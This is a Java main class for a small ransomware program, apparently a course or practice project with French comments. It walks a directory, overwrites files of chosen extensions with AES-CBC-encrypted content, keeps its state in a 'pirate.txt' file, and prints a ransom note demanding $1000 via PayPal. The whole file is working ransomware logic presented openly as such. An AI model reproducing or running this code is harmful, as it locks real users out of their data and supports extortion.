import cipher.AesCbc128Cipher;
import common.Action;
import common.FileExtension;
import common.FileSystemUtils;
import common.PirateFile;
import exceptions.InvalidArgumentException;
import java.io.File;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

public class Main {

  private static final Charset PROGRAM_CHARSET = StandardCharsets.UTF_8;
  private static final String PIRATE_FILE_NAME = "pirate.txt";

  private static String actionArg;
  private static String directoryArg;
  private static String[] targetExtensionsArgs = {};

  public static void main(String[] args) {

    try {
      extractCommandLineArguments(args);
      validateMandatoryArguments();
      Action action = getValidatedAction();
      List<String> extensions = getAllValidatedFileArgs();
      File workDirectory = FileSystemUtils.workDirectory(directoryArg);
      PirateFile pirateFile = new PirateFile(workDirectory.getPath() + "/" + PIRATE_FILE_NAME);

      if (action == Action.ENCRYPT && extensions.size() == 0)
        throw new InvalidArgumentException("No file extensions were specified for encrypt mode");
      if (action == Action.DECRYPT && extensions.size() == 0)
        extensions = pirateFile.readFileExtensions();


      if (action == Action.ENCRYPT) {
        pirateFile.initializePirateFile(); //si on encrypt, il faut créer pirate.txt s'il n'existe pas ou bien vider son contenue s'il existe
        pirateFile.saveFileExtensions(extensions);
      }

      AesCbc128Cipher cipher = new AesCbc128Cipher(pirateFile, PROGRAM_CHARSET);
      List<File> allFilesToManage = FileSystemUtils.allFilesToManage(workDirectory, extensions);
      for (File file : allFilesToManage.stream().filter(f -> !f.getName().contains(PIRATE_FILE_NAME)).collect(
          Collectors.toList())) {
        String fileContent = FileSystemUtils.getFileContent(file, PROGRAM_CHARSET);
        System.out.println("I want to perform action on : " + file.getName());

        String newContent = "";
        if (action == Action.ENCRYPT) {
          newContent = cipher.encrypt(fileContent);
          System.out.println("encrypting");
        } else {
          newContent = cipher.decrypt(fileContent);
          System.out.println("decrypting");
        }

        FileSystemUtils.overwriteFileContent(file, newContent);
      }

    } catch(Exception ex) {
      System.out.println(ex.getMessage());
      System.exit(1);
    }

    System.out.println("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,\n"
        + "une rançon de 1000$ doit être payée sur le compte PayPal hacker@gmail.com pour "
        + "pouvoir récupérer vos données.");
  }

  private static void extractCommandLineArguments(String[] args) throws ParseException {
    Options options = new Options();

    Option directory = new Option("d", "directory", true, "directory to encrypt or decrypt");
    directory.setRequired(false);
    options.addOption(directory);

    Option action = new Option("op", "operation", true, "operation to do: decrypt or encrypt");
    action.setRequired(true);
    options.addOption(action);

    Option extensions = new Option("f", "file", true, "specify which type of files to encrypt or decrypt");
    extensions.setRequired(false);
    options.addOption(extensions);

    CommandLineParser parser = new DefaultParser();
    HelpFormatter formatter = new HelpFormatter();
    CommandLine cmd = null;
    try {
      cmd = parser.parse(options, args);
    } catch (ParseException e) {
      formatter.printHelp("utility-name", options);
      throw e;
    }

    directoryArg = cmd.getOptionValue("d");
    actionArg = cmd.getOptionValue("op");

    String[] tempsExtensions = cmd.getOptionValues("f");
    targetExtensionsArgs = tempsExtensions == null ? targetExtensionsArgs : tempsExtensions;
  }


  private static void validateMandatoryArguments() {
    getValidatedAction();
    getAllValidatedFileArgs();
  }

  /**
   * Validation des arguments obligatoires: opération.
   * On retourne la constante de l'enumération pour usage future
   * */
  private static Action getValidatedAction() {
    for (Action action : Action.values()) {
      if (action.GetParameterName().equals(actionArg)) //on vérifie que l'operation spécifiée existe
        return action;
    }

    throw new InvalidArgumentException("Parameter <" + actionArg + "> is not valid for operation.");
  }

  /**
   * Validation des arguments obligatoires: extensions de fichier
   * */
  private static List<String> getAllValidatedFileArgs() {
    List<String> validExtensions = new ArrayList<>();
    for (String arg : targetExtensionsArgs) {
      FileExtension ext = getValidatedSingleFileArg(arg); //on vérifie que les extensions spécifées existent
      if (ext != null)
        validExtensions.add(ext.toRawExtension());
    }

    return validExtensions;
  }

  private static FileExtension getValidatedSingleFileArg(String arg) {
    for (FileExtension extension : FileExtension.values()) {
      if (extension.toRawExtension().equals(arg))
        return extension;
    }
    return null;
  }
}

